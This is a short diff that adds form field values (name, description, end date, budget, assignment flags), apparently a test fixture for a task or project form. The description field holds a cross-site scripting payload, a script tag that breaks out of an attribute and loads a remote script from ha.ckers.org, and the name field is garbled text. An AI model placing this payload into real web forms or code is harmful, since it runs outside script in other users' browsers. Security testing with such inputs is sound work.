@@ -1,0 +1,6 @@
+name : 7o H6'.G72 8':'o ..3 E
+desc : <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+end : 30.6.2016
+budget : 8,847
+assignto[] : 1
+assignme : 1
